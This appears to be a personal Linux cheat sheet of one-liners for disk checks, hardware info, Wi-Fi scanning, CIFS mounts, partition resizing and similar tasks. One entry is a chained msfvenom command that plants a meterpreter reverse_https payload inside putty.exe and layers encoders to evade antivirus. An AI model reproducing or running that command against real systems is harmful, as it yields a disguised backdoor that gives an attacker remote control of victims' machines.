# Short howto

## Disk check
badblocks -v -n /dev/sda # -n for non-destruction read-write test  
smartctl -a /dev/sda

## du hidden files
du -sch .[!.]* * |sort -h

## Hardware info
dmidecode [-t memory]  
ethtool	enp0s25 	// link speed  
lsusb  
lspci  
hwinfo

## Clone web page with HTTrack
httrack --near --display --extra-log --keep-alive --tolerant --can-go-up-and-down -u2 --urlhack -T60 -R9 -O ./. 'http://'

## Scan for SSID / get info about AP
sudo iw dev wlp3s0 scan | grep SSID  
iw dev wlp1s0 [link | station dump | scan]

## Get max (not ultimate) compression with tar.xz
XZ_OPT=-9 tar cJf export.tar.xz export/

## Mount CIFS
mount -t cifs -o username=USER,domain=DOMAIN,uid=1000,gid=1000 //xxx.xxx.xxx.xxx/Files /media/fs/

## Encode payload multiply times with msfvenom
msfvenom -p windows/meterpreter/reverse_https -f raw -e x86/shikata_ga_nai -x /tmp/putty.exe -k |msfvenom -p - -a x86 --platform windows -e x86/jmp_call_additive -f raw | msfvenom -p - -a x86 --platform windows -f raw -e x86/call4_dword_xor | msfvenom -p - -a x86 --platform windows -f exe -o test_putty -e x86/shikata_ga_nai

## Resize root partition
1. fdisk  
a. list  
b. delete  
c. new with first sector exactly like on a.  
d. write  
2. resize2fs /dev/sda1

## Run nohup command with ssh
ssh -n -f user@host "sh -c 'cd /whereever; nohup ./whatever > /dev/null 2>&1 &'"

## Connect to open wifi
iwconfig wlp3s0 essid <name>  
iwconfigwlp3s0 ap any


